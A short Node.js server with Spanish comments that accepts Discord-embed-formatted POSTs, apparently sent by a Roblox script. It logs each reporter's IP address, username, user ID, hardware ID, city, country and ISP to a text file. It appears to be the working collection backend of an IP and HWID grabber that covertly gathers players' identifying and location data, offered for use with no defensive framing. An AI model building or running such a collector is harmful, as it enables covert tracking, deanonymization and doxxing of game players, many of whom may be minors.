const http = require('http');
const fs = require('fs');

const server = http.createServer((req, res) => {
    // Cabeceras CORS para permitir conexiones externas
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    if (req.method === 'OPTIONS') {
        res.writeHead(204);
        res.end();
        return;
    }

    if (req.method === 'POST') {
        let body = '';
        
        req.on('data', chunk => {
            body += chunk.toString();
        });

        req.on('end', () => {
            try {
                const data = JSON.parse(body);
                const timestamp = new Date().toISOString();
                
                let info = {};

                // Extraemos todos los campos del formato Discord Embeds de tu script de Roblox
                if (data.embeds && data.embeds[0] && data.embeds[0].fields) {
                    data.embeds[0].fields.forEach(field => {
                        info[field.name] = field.value;
                    });
                }

                // Armamos la línea de registro con los datos extraídos
                const logEntry = `[${timestamp}] IP: ${info["IP Address"] || 'N/A'} | User: ${info["Username"] || 'N/A'} (ID: ${info["User ID"] || 'N/A'}) | HWID: ${info["HWID"] || 'N/A'} | Ubicación: ${info["City"] || 'N/A'}, ${info["Country"] || 'N/A'} | ISP: ${info["ISP"] || 'N/A'}\n`;
                
                console.log("Nuevo reporte completo guardado:", logEntry);

                // Guardamos en el archivo logs.txt
                fs.appendFile('logs.txt', logEntry, err => {
                    if (err) console.error("Error al guardar en el archivo:", err);
                });

                res.writeHead(200, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({ status: "success", message: "Guardado correctamente" }));
            } catch (e) {
                console.error("Error al procesar JSON:", e);
                res.writeHead(400, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({ status: "error", message: "JSON inválido" }));
            }
        });
    } else {
        res.writeHead(404, { 'Content-Type': 'text/plain' });
        res.end("Ruta no encontrada");
    }
});

// Usando tu puerto dinámico asignado por Bot-Hosting
const PORT = process.env.PORT || 26237;
server.listen(PORT, () => {
    console.log(`Servidor activo en el puerto ${PORT}`);
});
